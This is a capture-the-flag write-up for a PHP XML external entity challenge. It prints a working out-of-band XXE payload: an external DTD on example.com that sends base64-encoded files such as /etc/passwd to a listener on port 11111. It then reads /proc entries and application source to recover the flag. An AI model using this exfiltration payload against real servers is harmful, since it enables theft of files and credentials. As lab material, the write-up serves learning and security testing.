# Leakage problem

Leakage problem was a PHP based XML external entity (XXE) injection challenge. The website
has a single field which expects an email address:

<img width="725" alt="image" src="https://user-images.githubusercontent.com/6275775/231825682-9b661676-cd6f-4bb1-9be1-03560a21a030.png">

The first thing to notice is that the corresponding request contains an xml payload:

```
<?xml version="1.0"?>
<form>
<email>xxx@foo.com</email>
</form>
```

This immediately triggers the XXE attack vector. I have a small server running where
I can host payloads for such competitions, so after some trial and error I got to the
following setup. (I'll use example.com below instead of the real server.)


```
# https://example.com/foo.dtd
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://example.com:11111/?%file;'>">%start;
```

and send this to the website:

```
<?xml version="1.0"?>
<!DOCTYPE form [ 
    <!ENTITY % remote SYSTEM "https://example.com/foo.dtd">
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
     %remote;
     %send;
 ]>
<form />
```

I can listen to the incoming requests in my server with:
```
nc -l localhost 11111
```

This works fine, I get the `/etc/passwd` file. What else can we steal? I looked around the 
`/proc` folder in my linux machine for inspiration then tried things like `/proc/self/cmdline`,
`/proc/self/cwd/index.php` and `/proc/self/cwd/register.php`:

```php
# register.php
...

if( isset($creds->email)){
    $url = 'http://127.0.0.1:4200/register';
    $data = array('email' => $creds->email);
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded",
            'method'  => 'POST',
            'content' => "email=".$creds->email
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $success=True;
}
...
```

Ok, we have nice LFI, and it seems that the register.php forwards the request to an other service
that runs on port 4200.

I also checked `/proc/1/cmdline`:

```
/bin/sh -c apachectl start && node index.js
```

Reading from '/proc/1/cwd/index.js/ didn't work. I think the cwd file (which is a symlink to the
process' working directory has too restrictive access modifiers. But... maybe it is running in the `/app` 
directory, let's try `/app/index.js`:

```javascript
/* index.js */

const express = require("express");
const schema = require("./schema");
const resolvers = require("./resolvers");
const { graphqlHTTP } = require('express-graphql');
const {Users} = require('./users')
const bodyParser = require('body-parser')

const urlencodedParser = bodyParser.urlencoded({ extended: false })

const app = express();

app.use(
  "/graphql",
  graphqlHTTP({
    schema,
    rootValue: resolvers,
    graphiql: true
  })
);

app.post('/register',urlencodedParser,(req, res) =>{
  try{
    if(typeof req.body.email != 'undefined' && req.body.email){
      Users.push({email:req.body.email});
    }
  }catch(e){}
  return res.end();
});


const port = process.env.PORT || 4200;
app.listen(port);

console.log(`GraphQL Server is ready at http://localhost:4200/graphql`);
```

Bingo. We can now download all the files mentioned in the import section (add .js to the 
filenames), soon we'll run into `data.js` which is kind of big and has some base64 encoded data in it. 
This is some weird picture of Shrek with our most wanted flag.

It was not the intended way to solve the challenge, I avoided the whole grapql thing and
I was lucky with looking into the `app` folder, but it was an educated guess which worked 
this time.
